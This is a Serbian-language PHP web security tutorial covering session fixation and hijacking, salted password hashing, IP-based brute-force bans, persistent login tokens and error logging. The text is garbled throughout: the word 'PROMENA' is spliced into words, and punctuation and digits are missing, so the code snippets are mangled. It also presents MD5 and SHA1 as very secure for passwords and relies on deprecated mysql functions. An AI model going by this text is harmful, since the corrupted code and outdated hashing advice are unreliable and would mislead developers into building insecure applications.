HTML dokumentaPROMENA svaka veza između klijenta i servera se raskida Pošto web serveri nemaju mogućnost održavanja veze između klijenta i servera a iz razloga da savremeni poslovni i programerski izazovi nameću da se kroz HTTP omogući konstanto održavanje veze nastao je PHP sistem za upravljanje sesijama Da bismo znali da pravilno upravljamo ovimPROMENA sistemom moramo gaPROMENA dobro razumeti i predvideti sve moguće sigurnosne propuste  Sesije nam omogućavaju da izgradimoPROMENA većuPROMENA interakciju sa posetiocima da pri svakom zahtevu znamo da se radi o određenom korisniku i da muPROMENA serviramo sadržaj koji je namenjen baš zaPROMENA njega individualno Takođe mogli bismo i da sačuvamo neke podatke u sesiji i da ih koristimo i u narednim zahtevima na primer da priPROMENA prvoj poseti klijentaPROMENA upišemo u brojač poseta nulu i da pri svakoj narednoj poseti povećamo tajPROMENA brojač i tako pravimo statistikuPROMENA Međutim većuPROMENA korisnost imaju u izgradnji ozbiljne multi korisničke aplikacije gde je potrebno da PHP aplikacija zna o kojem se konkretnom korisniku radi pri svakom zahtevu  One rade poPROMENA principuPROMENA identifikacije pri svakom zahtevuPROMENA odnosno i klijent i server moraju imati neke identične podatkePROMENA potrebne za identifikaciju Kako se identifikatorPROMENA sesije može ukrastiPROMENA ili pod veoma malim šansama pogoditi pa to napadačuPROMENA daje mogućnost da ga naša PHP aplikacija identifikuje kao regularnog korisnika aliPROMENA ukoliko jePROMENA to cilj napadačaPROMENA iPROMENA kaoPROMENA administratoraPROMENA sistema Podaci o sesiji na serverskoj strani mogu se čuvati na hard disku podrazumevanoPROMENA ili uPROMENA bazi podataka ali se kod korisnika mogu čuvati u kolačićima ili biti poslati preko URL adrese u viduPROMENA parametra Dok je čuvanje i vođenje sesije preko URL adrese veoma nesigurno jer je identifikator sesije javno otkriven i može biti lako ukraden čuvanje u kolačićima je znatno sigurnije zbog sledećih razloga Kolačići se ne vide odnosno šalju se kroz header zahteva Mogu biti enkriptovani i tako transportovani HTTPS Ali kolačići imaju i svoje mane odnosnoPROMENA kolačići se na klijentskoj strani mogu isključiti iPROMENA u tom slučaju sesija se ne bi mogla održati U svakom slučaju ukoliko bismo želeli sigurnu aplikaciju moramoPROMENA biti spremni na gubitak veomaPROMENA malog broja korisnikaPROMENA koji ne žele da koristePROMENA kolačiće UPROMENA novijim verzijama PHP a podrazumevano je uključeno čuvanje identifikatora sesije samo u kolačiću ali preporuka je da ovo treba proveriti i postarati sePROMENA daPROMENA je session usePROMENA only cookies uključeno  ini setPROMENA session use only cookies   ili prekoPROMENA htaccessPROMENA fajla phpPROMENA flag session use only cookies on  Generalno napad preko sesije se može izvesti na tri načina Pogađanje OtmicaPROMENA Fiksacija Pogađanje identifikatora sesijePROMENA jePROMENA namanje verovatanPROMENA metod napada jer je sistem za kreiranje sesije ekstremno nasumičan Druga dva načina suPROMENA veomaPROMENA moguća i često su metodaPROMENA napada FiksacijaPROMENA sesija SessionPROMENA Fixation Na jednostavnom sistemu gde se sistem sesija koristi samo sa sessionPROMENA start i podacima se pristupaPROMENA preko SESSIONPROMENA globalne promenjive svaki napadač može jednostavnoPROMENA kreirati svoj identifikatorPROMENA sesije i tako ugroziti sigurnost DaklePROMENA fiksacija sesija predstavlja kreiranje identifikatora sesije od samog napadača i tako ignorišući PHP sistem za kreiranje identifikatora Svakako toPROMENA ne samo da može da izazove greške u radu aplikacije već može da predstavlja i ozbiljan sigurnosni propust  Rešenje ovog problema leži uPROMENA ponovnomPROMENA generisanju identifikatora sesijePROMENA   php session startPROMENA if isset SESSIONPROMENA pokrenuta  session regenerate id  SESSION pokrenuta true  Zaštita je u tomePROMENA daPROMENA se zaista proveri da li jePROMENA takvaPROMENA sesija već pokrenuta i ukoliko nije biće generisan novi identifikator sesije koji će ujednoPROMENA prepisati identifikator napadačaPROMENA Ovaj k d ujednoPROMENA predstavlja iPROMENA best practice za kreiranje sesija Otmica sesija Session Hijacking Već je napomenuto da se sesija može oteti i ovo jePROMENA veoma često metoda napada Na jednostavnom sistemu sasvim je dovoljno da napadač posedujePROMENA identifikator sesijePROMENA odnosno da poseduje kolačić uPROMENA kojem se čuva taj identifikator On se jednostavno može ukrasti naPROMENA više načina i jednoPROMENA od njih je presretanje podataka ukoliko se ne koristi HTTPS protokol ili još jednostavnije ukoliko ima pristup klijentskom računaru OsimPROMENA napada na samog klijenta može se izvesti napad i na serverPROMENA naročito ako je u pitanju deljeni server i podaci o sesijama se čuvaju u zajedničkom direktorijumu Pošto već ne možemo zaštiti korisnike od presretanja podataka i pristupa napadača njihovom računaru možemo zakomplikovati proveruPROMENA korisnika odnosno u obzir uzeti još neke podatke o korisniku sem identifikatora sesije MožemoPROMENA dodati na primerPROMENA podatke o klijentu odnosno User Agent  php session start PROMENA if isset SESSION HTTP USER AGENT  if SESSION HTTP USER AGENT md SERVER HTTP USER AGENT  User Agent je promenjen prikazati login  exit  else  Upisati informacije o User Agent uPROMENA  SESSION HTTP USER AGENT md SERVER HTTPPROMENA USER AGENT  Ovakvim sistemom napadač sem što mora imati žrtvin identifikator sesije mora imati i User Agent koji nije povezan sa sesijama Realno opasnost i dalje postojiPROMENA ali i ovakvo jednostavna komplikacija i dodatne provere drastično povećavaju sigurnost Takođe treba uzeti u obzir i da smanjenje trajanja sesije kao i češće generisanjePROMENA novog identifikatora mogu u velikoj meri povećati sigurnost AutentifikacijaPROMENA i autorizacija korisnikaPROMENA Mnoge web aplikacije zahtevaju od korisnika da se registruju kasnije i uloguju Te web aplikacijePROMENA čuvaju našaPROMENA korisnička imena i lozinke i veoma je bitno da oni budu zaštićeni od krađe i metoda slučajnih napada kako bi zaštitili privatnost korisnika a ujedno i celokupnu sigurnost aplikacijePROMENA  Autentifikacija je proces kojim se osigurava ispravnost korisničkog identitetaPROMENA To uglavnom podrazumeva jednostavnu proveru korisničkogPROMENA imena iPROMENA lozinke Autorizacija je metod pristupa zaštićenim kontolama i podacima koji omogućava samo autorizovanim korisnicima daPROMENA im pristupe Na primer mnoge aplikacije poseduju stranice koje su rezervisane samo za administratora sistema i stranice kojePROMENA mogu da posete ostali korisnici Password hashing Ukoliko bi se pravillaPROMENA web aplikacija koja zahteva registraciju i loginPROMENA moramo se osigurati daPROMENA je sistem čuvanja lozinki siguran Čuvanje korisničkih lozinki u bazi podataka je vema ozbiljna temaPROMENA i veoma čest sigurnosni propust Ukoliko bi napadač neprimetno ukrao takvo bazuPROMENA podataka mogao bi da se prijavi na sistem baš kao bilo koji naš korisnik Ili ukoliko pristup bazi podataka ima više lica svakako nije dobroPROMENA ma koliko ta lica bila proverena da imaju uvid u sve korisničke lozinke Ne samo da takve lozinke mogu biti iskorišćeni na našoj web aplikacijiPROMENA opšte je poznato da korisnici koriste iste lozinke za prijavu i na druge sisteme kao štu suPROMENA lični email bankovni račun i sl Sigurnost privatnih podataka naših korisnika svakako treba imati u vidu kadaPROMENA pravimo bilo kakvu web aplikaciju Password hashingPROMENA je metoda dobijanja hash vrednosti korišćenjemPROMENA jednosmernih enkripcija PHP podržava dve često korišćene funkcije za jednosmernu enkripcijuPROMENA MD bit i SHA bitPROMENA Obe funkcije su veoma sigurne i veoma malu verovatnoću koalizije  echo md bilosta f dfbe e ee a ePROMENA echo sha bilosta e cd c d ccaPROMENA de cb fd c eb  Korišćenje md funkcije za zaštitu enkripcije je veoma jednostavno Prilikom registovanjaPROMENA korisnička lozinka se konvertuje u hash stringPROMENA i kao takav čuva uPROMENA bazi Sve što treba da uradimo prilikom provere je da konvertujemo unetu lozinku u hash string i kaoPROMENA takvogPROMENA da ga uporedimo sa onim iz baze  Registracija korisnika  username mysql real escape string POSTPROMENA usernamePROMENA  password md POST password PROMENA  sqlPROMENA INSERT INTO korisnici username password VALUES username passwordPROMENA    Provera login a  username mysql realPROMENA escape string POST username PROMENA password md POST password   sql SELECTPROMENA FROM korisnici WHERE username username AND password password PROMENA result mysql query sql if mysql numPROMENA rows result PROMENA pogrešni podaci  I ako je ovakav način sigurnosti znatno bolji od čuvanja teksualnih lozinki u baziPROMENA podataka postoje metode kao što suPROMENA brute force kojePROMENA iz hash stringa mogu izvući prvobitnu lozinku Što jePROMENA lozinka jednostavnijaPROMENA to su veće šanse da se uPROMENA veoma katkom vremenskom periodu uspešno izvrši napad Recimo da bi za hash vrednost lozinkePROMENA od karaktera kojaPROMENA sadrži mala slova i brojeve bilo potrebno svega par minuta za dobijanje originalne vrednosti  Bolji način čuvanja lozinki jePROMENA saltovanje lozinki Odnosno priključenje predefinisanog stringa koji će povećati kompleksnostPROMENA lozinke i time sprečiti brute force otkrivanje lozinki iz hash stringa Za salt string možemoPROMENA koristiti definisanu vrednost kojaPROMENA se globalnoPROMENA priključuje svim lozinkama iliPROMENA da za svakog korisnika generišemoPROMENA novi saltPROMENA string i čuvamoPROMENA ga u bazi podataka   php definePROMENA SALT DFGBHJfghJ   password md SALT md POST password  U ovom slučaju svakako treba osigurati da SALT konstantuPROMENA nikada nećemo menjati u suprotnom ćemo imatiPROMENA problem Generisanje ovakvog random hash stringaPROMENA za svakog korisnika iPROMENA čuvanje njegove vrednosti u bazi je jedno od mogućih rešenja Čak iPROMENA korišćenjePROMENA korisničkog imena kao SALT vrednost može dati dobre rezultate U svakom slučaju pri projektovanju aplikacije treba definisati standardePROMENA za ovakve stvari iPROMENA njih se pridržavati  Ovakav način zahteva da korisniku nikada ne možemo vratiti originalnu zaboravljenu lozinku Generisanje nove lozinke i slanje na korisnikovuPROMENA email adresu je zadovoljavajuće rešenje uz određene provere Brute force Brute force je metoda napada kojom korisnik pokušava unosom nasumičniih podaka da se identifikujePROMENA na sistemu Najčešće napad se koristi uz pomoć nekog softvera koji omogućava da u veoma kratkom vremenu izvrši što više napadaPROMENA pritom koristeći predefinisanePROMENA tabele najčešće korišćenih lozinki JasnoPROMENA jePROMENA da bi posle nekogPROMENA vremena uspeo da se identifikuje kao neki korisnik ili kao administrator i time ugrozi bezbednost celog sistema Dobro rešenje za zaštitu je da napadaču zabranimo pristup sajtu naPROMENA određeno vreme ukoliko se identifikuje ovakva vrsta napada Problem je na kojiPROMENA načinPROMENA to izvršiti jer svaki od njihPROMENA ima svoje prednosti iPROMENA nedostatke Zabrana pristupa preko IP adrese UkolikoPROMENA se otrkije ovakva vrstua napada moglaPROMENA bi se zapisati IP adresu napadača i zabraniti mu da se uloguje na određeno vremePROMENA Kod koji opisuje ovakav način radaPROMENA jePROMENA sledeći  php  ProveraPROMENA IP adrese  ip mysql realPROMENA escapePROMENA string SERVER REMOTEPROMENA ADDR PROMENA now time   sql SELECT FROM banned WHERE ip ip AND expire now AND attempts LIMIT  result mysql queryPROMENA sql if mysql num rows resultPROMENA  zabranitiPROMENA pristup  exit  PROMENA Provera korisničkih podataka  username mysql real escape string POST username PROMENA password md SALT POST password   sql SELECT FROM korisnici WHERE username username AND password password  resultPROMENA mysql query sqlPROMENA if mysqlPROMENA numPROMENA rows result  pogrešni podaci  expire time zabrana pristupaPROMENA na minuta PROMENA sql INSERTPROMENA INTO banned ipPROMENA expire attempts VALUES ip expire  ON DUPLICATE KEY UPDATE expire expire attempts attempts  mysql query sql  prikaži grešku  exit  I ako je ovaj načinPROMENA relativno dobar teoretskiPROMENA ozbiljni napadači mogu da koriste proxyPROMENA servere i tako svaki put imati drugu IP adresu Međutim ukoliko je zaštita na samom severu dobro postavljena veliki brojPROMENA zahteva ovakvog tipa će biti zaustavljen i pre nego što dođe doPROMENA aplikacije i ovakavPROMENA način zaštite je sasvim dovoljan za prosečne web aplikacije PROMENA Postoje i drugi načini zabrane pristupa i mogu se izvesti korišćenjem sesija obaveznim korišćenjem JavaScriptaPROMENA ili čak zabrana pristupa određenom korisniku TačnijePROMENA mogli bismo veoma sličanPROMENA sistem kao gore napraviti tako što bi se u tabelu korisnika dodali entitet koji nam označava broj pokušaja pa tako ukoliko jedan korisnik pogreši više puta lozinku možemoPROMENA mu zabraniti pristup na određenoPROMENA vreme Dugotrajno održavanje sesija Dobra opcija web aplikacije je svakako da zapamti našuPROMENA autentifikaciju na određeno vreme odnosno dugotrajno održavanje sesija Prostim rečima ukolikoPROMENA se korisnikPROMENA danas uloguje na sistem želeoPROMENA bi i sutra da bude ulogovan umestoPROMENA da pri svakoj poseti ponovo unosi korisničke podatke Veoma lošePROMENA rešenje a i često korišćeno je da se u cookie smesti korisničko ime i lozinka i daPROMENA se pri svakom zahtevu ono proverava Čak i kada bi koristili enkripciju te lozinke ovakav sistem predstavlja sigurnosni rizik  Dugotrajno održavanje sesijaPROMENA se može izvršiti korišćenjem tokena odnosno vrednosti u cookiePROMENA u koji nam služi za identifikaciju Problem nastaje pri korišćenju nesigurnihPROMENA veza odnosno nepostojanje HTTPS veze koja bi osigurala siguran transfer tokena Postoji velika mogućnost da napadač može takav cookie da ukrade i da se uz pomoćPROMENA njega idenfikuje na našem sajtu Međutim naš zadatak je da ovu mogućnost što više otežamo napadaču Token svakako treba da budePROMENA unikatan za svakog korisnika koji ne sadrži bilo kakve korisničke podatkePROMENA Takav token možemoPROMENA lakoPROMENA napraviti   token md uniqid rand TRUE  Ovakav token bi trebalo da poseduje i klijentPROMENA i serverPROMENA odnosno iPROMENA korisnik u svomPROMENA cookie u i miPROMENA u našoj bazi podatakaPROMENA JednostavnaPROMENA autentifikacija bi izledala ovakoPROMENA  php if isset COOKIE token   token mysql real escape string COOOKIE token  sql SELECT FROM korisnici WHERE token tokenPROMENA  resultPROMENA mysql query sql  if mysql num rows  token je istekao  korisnik FALSE  exit  else  korisnikPROMENA je ulogovan  korisnik TRUE  Kako bi se osiguralo da napadač ne bi mogao da iskoristi ukradeni token možemo veoma često paPROMENA čakPROMENA i pri svakom zahtevu daPROMENA promenimo token Ovo je skupa operacija jer pri svakom zahtevu moramo imati UPDATE upit Ali generalno saveti za korišćenjePROMENA ovakvog sistema Ne treba omogućavati predugo čuvanje tokena najviše doPROMENA nedelju dana Pri svakojPROMENA autentifikaciji promeniti token Ovakav sistem koristiti samo za autorizaciju ka resursima korisnika dok biPROMENA administrator trebao da izbegne dugotrajnoPROMENA očuvanje sesijaPROMENA Upravljanje greškama  Bugovi u web aplikaciji su sastavni deo programiranja Prosto je nemoguće da programer naročito početnik napiše aplikaciju iz prve a da ona ne sadrži neku grešku Ovaj problem se naročito javlja sa porastom aplikacije brojem opcija i funkcionalnošću gde je te greške mnogo teže uočiti i rešavati ih Greške koje se pravePROMENA u PHP programiranju su ništa drugačije odPROMENA onih uPROMENA svim drugim programskim jezicima i generalno mogu bitiPROMENA MatematičkePROMENA deljenje sa nulom problemi saPROMENA operacijama zaokruživanjemPROMENA i sl Logičke beskonačne petlje ili beskonačne rekurzije problemi saPROMENA petljama Sintaksne korišćenje pogrešnog operatora iPROMENA sl Resursi problemi saPROMENA memorijom korišćenje neicijalizovane promenjive rad sa pogrešnim tipovima podataka i slPROMENA Veoma korisni direktiva za rešavanje sinaksnih grešaka je error reporting aliPROMENA samo u stadijumu dok jePROMENA aplikacijaPROMENA još uvek u razvoju Ukoliko je web aplikacija postavljena live korisnicima ne bi trebalo prikazivati greške ali bi i dalje trebalo voditi računaPROMENA o nijma error reporting E ALL E STRICT ini set display errors ini setPROMENA log errors ini set errorPROMENA log home userPROMENA logs php logs log  Prva linija služi za uključenje svihPROMENA grešaka kao što su sinaksne greške upozorenja iPROMENA obaveštenja dok druga linija služi daPROMENA one ne buduPROMENA odštampane na ekranu Treća linija osigurava da se sve greške loguju a četvrta je samoPROMENA putanja do fajla gde želimoPROMENA da čuvamo sve logove Logove sa greškama treba redovno proveravati jer najveći broj bug ovaPROMENA će baš u njima biti zapisan TakođePROMENA prilikom pravljenja alikacije preporučljivo je i napraviti sistem za upravljanje greškama Na primer ovakav sistem nam može logovati sve upite koji ne mogu da sePROMENA izvršePROMENA sa detaljnim objašnjenjem datotekom i linijomPROMENA k da u kojoj je greška nastala logovati ih ili još bolje poslati ih na email adresu kako bi greška što pre bila uočljiva i na vreme se sanirala Opšte preporuke za sigurnost webPROMENA aplikacijaPROMENA Na sigurnostPROMENA ne treba gledati kao na karakteristiku već na kao proces kojiPROMENA se treba stalno usavršavati i dorađivati i naročito ulagati u njega Štete nastale nesigurnimPROMENA programiranjem u nekimPROMENA slučajevima mogu biti nesrazmerive pa tako ceo naš trud i godinama građeno Internet poslovanje može pasti u sekundi samo zbog jedne ili par linija k da Veoma često se dešavaPROMENA da programeri tokom razvoja aplikacije ignorišu sigurnost iPROMENA trude se da aplikacija proradi a sigurnost ostavljaju za kasniju fazuPROMENA koja uglavnom nikada i neće doći na red To je veoma pogrešan pristup i treba imatiPROMENA uvek na umu da nije dovoljno dobro ako aplikacija radi ono što smo zamislili već iPROMENA daPROMENA bude otporna na napade i daPROMENA pravilno upravlja greškamaPROMENA DaklePROMENA sigurnost aplikacije treba uzimati u obzir u ranim fazama razvoja i već pri projektovanju napravitiPROMENA dobar koncept kojeg sePROMENA treba pridržavati tokom celog razvoja  Takav koncept svakako treba sadržati sledeću metadologiju Bezbednost aplikativne arhitekture Upravljanje greškama FiltriranjePROMENA i validacija inputa Testiranje Već je spomenuto da sigurnost naše aplikacijePROMENA zavisi i od sigurnosti serveraPROMENA na kojem se nalazi Ukoliko takav server poseduje zastreo i ranjiv softver velika je verovatnoća da je i naša aplikacija i baza podataka ugrožena Svakako je najbolje rešenje imati celoukpnu kontrolu nad serverom i voditi računa da je softver uvek up to date Međutim često to iz finansijskih razloga nije moguće pa smo opredeljeni zaPROMENA zakup hostinga na nekom serveru U tom slučaju uvek birati kvalitetnePROMENA i proverene hosting provajdere koji imaju ozbiljan pristupPROMENA bezbednosti aplikativnog softvera ne uzdati se previše u njihove sisteme bekapa podataka već samostalno brinuti o tomePROMENA  Projektovanje sistema za upravljanje greškama treba uzeti u obzir u najranijoj fazi izgradnje aplikacije a prilikom razvoja oslanjati se na taj sistemPROMENA Dobar sistem za upravljanje greškama treba da sadrži sa jedne strane obaveštenje za korisnike o nastaloj grešci koja ne sadrži nikakve tehničke detalje o toj grešciPROMENA a sa druge strane obaveštenje za programere koje sadrži što više tehničkih detalja koji otkrivaju uzrok greške i mesto nastanka Svakako treba uzeti u obzir i alate koji služe za pronalaženje grešaka kao na primer PHP Unit PROMENA U ovom kursu je mnogoPROMENA puta spominjana važnost filtriranja inputa i to je najvredniji savetPROMENA koga se trebaPROMENA pridržavati Uvek treba razmišljati u kritičnom stavu osmisliti najgori scenario i sprečiti ga Kao štoPROMENA je već napisano korisnikuPROMENA nikada ne treba verovati iPROMENA to uvek treba imati na umu Filtrirati svaki input proveravati i najmanje moguće greške kao štoPROMENA su dužinaPROMENA stringa i slične i nikada se ne uzdati uPROMENA mogućnost HTML a i JavaScripta za validaciju inputa Koliko god dobroPROMENA zaštitiliPROMENA našu formu JavaScript funkcijama one uvek mogu biti zaobiđene kao i sve što se izvršava na klijentskoj strani  BezbednostPROMENA se možePROMENA najlakše podići naPROMENA viši nivo prostim testiranjem Jednostavno razmišljajte kao napadač uzmite u obzirPROMENA sve moguće scenarije i na taj načinPROMENA koristite aplikaciju Krenite od prostih stvari isključitePROMENA JavaScriptPROMENA i pošaljite prazan formular unesite neispravne podatke pokušajtePROMENA SQL Injection U ovom kursu suPROMENA opisane najčešće korišćene metode napada pa isprobajte svakuPROMENA nad vašomPROMENA aplikacijom Ukoliko otkrijete i najmanji mogući propust rešite ga odmahPROMENA  